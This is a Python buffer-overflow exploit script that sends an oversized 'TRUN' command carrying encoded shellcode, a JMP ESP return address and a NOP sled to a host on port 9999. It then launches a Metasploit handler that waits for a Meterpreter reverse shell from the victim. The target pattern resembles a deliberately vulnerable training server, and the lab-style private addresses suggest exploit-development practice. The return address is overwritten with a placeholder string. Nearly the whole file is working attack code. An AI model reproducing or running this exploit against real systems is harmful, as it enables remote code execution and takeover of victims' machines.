#!/usr/bin/env python
#!/usr/local/bin/python

#statically defined addresses and ports. Created as an example.

import socket
import os

#EIP IS JMP ESP ADDRESS TODO MAY NEED TO BE INVERTED
eip = "\xAF\x11\x50\x62"
eip = "CDEF"
buf =  ""
buf += "\x2b\xc9\x83\xe9\xaa\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x95\xf0\xe0\x9a\x83\xee\xfc\xe2\xf4\x69\x18"
buf += "\x62\x9a\x95\xf0\x80\x13\x70\xc1\x20\xfe\x1e\xa0\xd0"
buf += "\x11\xc7\xfc\x6b\xc8\x81\x7b\x92\xb2\x9a\x47\xaa\xbc"
buf += "\xa4\x0f\x4c\xa6\xf4\x8c\xe2\xb6\xb5\x31\x2f\x97\x94"
buf += "\x37\x02\x68\xc7\xa7\x6b\xc8\x85\x7b\xaa\xa6\x1e\xbc"
buf += "\xf1\xe2\x76\xb8\xe1\x4b\xc4\x7b\xb9\xba\x94\x23\x6b"
buf += "\xd3\x8d\x13\xda\xd3\x1e\xc4\x6b\x9b\x43\xc1\x1f\x36"
buf += "\x54\x3f\xed\x9b\x52\xc8\x00\xef\x63\xf3\x9d\x62\xae"
buf += "\x8d\xc4\xef\x71\xa8\x6b\xc2\xb1\xf1\x33\xfc\x1e\xfc"
buf += "\xab\x11\xcd\xec\xe1\x49\x1e\xf4\x6b\x9b\x45\x79\xa4"
buf += "\xbe\xb1\xab\xbb\xfb\xcc\xaa\xb1\x65\x75\xaf\xbf\xc0"
buf += "\x1e\xe2\x0b\x17\xc8\x98\xd3\xa8\x95\xf0\x88\xed\xe6"
buf += "\xc2\xbf\xce\xfd\xbc\x97\xbc\x92\x79\x08\x65\x45\x48"
buf += "\x70\x9b\x95\xf0\xc9\x5e\xc1\xa0\x88\xb3\x15\x9b\xe0"
buf += "\x65\x40\x9a\xea\xf2\x39\xe0\x0d\x1b\xfd\xf2\xe0\x8b"
buf += "\xc9\x79\x06\xca\xc5\xa0\xb0\xda\xc5\xb0\xb0\xf2\x7f"
buf += "\xff\x3f\x7a\x6a\x25\x77\xf0\x85\xa6\xb7\xf2\x0c\x55"
buf += "\x94\xfb\x6a\x25\x65\x5a\xe1\xfa\x1f\xd4\x9d\x85\x0c"
buf += "\x72\xf2\xf0\xe0\x9a\xff\xf0\x8a\x9e\xc3\xa7\x88\x98"
buf += "\x4c\x38\xbf\x65\x40\x73\x18\x9a\xeb\xc6\x6b\xac\xff"
buf += "\xb0\x88\x9a\x85\xf0\xe0\xcc\xff\xf0\x88\xc2\x31\xa3"
buf += "\x05\x65\x40\x63\xb3\xf0\x95\xa6\xb3\xcd\xfd\xf2\x39"
buf += "\x52\xca\x0f\x35\x19\x6d\xf0\x9d\xb2\xcd\x98\xe0\xda"
buf += "\x95\xf0\x8a\x9a\xc5\x98\xeb\xb5\x9a\xc0\x1f\x4f\xc2"
buf += "\x98\x95\xf4\xd8\x91\x1f\x4f\xcb\xae\x1f\x96\xb1\xff"
buf += "\x65\xea\x6a\x0f\x1f\x73\x0e\x0f\x1f\x65\x94\x33\xc9"
buf += "\x5c\xe0\x31\x23\x21\x65\x45\x42\xcc\xff\xf0\xb3\x65"
buf += "\x40\xf0\xe0\x9a"


#THIS IS NOP BECAUSE WE WANT TO slide -> EIP
nop = "\x90"*20

#CONNECT AND OVERLOAD
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.237.128", 9999))
s.settimeout(5)
s.send("TRUN ."+"A"*2006+eip+nop+buf)
print(s.recv(1024))

#opens metaploit and initiates a reverse shell on victim
os.system("""msfconsole;
use multi/handler;
set payload windows/meterpreter/reverse_tcp;
set lhost 172.16.237.129;
set lport 4444;
exploit""")


s.close()
